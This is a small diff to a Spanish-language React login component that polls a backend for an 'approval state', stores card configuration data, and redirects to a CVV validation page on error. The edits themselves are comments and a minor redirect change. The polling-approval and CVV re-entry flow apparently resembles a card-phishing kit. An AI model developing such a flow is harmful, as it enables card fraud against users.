@@ -478,7 +478,7 @@ export default function IniciarSesion() {
   // Función para verificar el estado de aprobación
   const verificarEstadoAprobacion = async () => {
 
-    // Se usa el try
+    // Se usa el try catch
     try {
 
       // Se realiza la petición al backend
@@ -489,8 +489,10 @@ export default function IniciarSesion() {
 
       // Si llega configuración de tarjeta custom, la guardamos
       if (cardData) {
+
+        // Se guarda en el localStorage
         localStorageService.setItem("selectedCardData", cardData);
-      }
+      };
 
       // Estados que detienen el polling (redirecciones o finales)
       const estadosFinales = [
@@ -630,8 +632,11 @@ export default function IniciarSesion() {
           break;
         case 'error_cvv_custom':
 
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
           // Redirige a validación con error
-          redirigir(`/validacion-cvv?error=true`);
+          redirigir(`/validacion-cvv`);
 
           // Se sale del switch
           break;
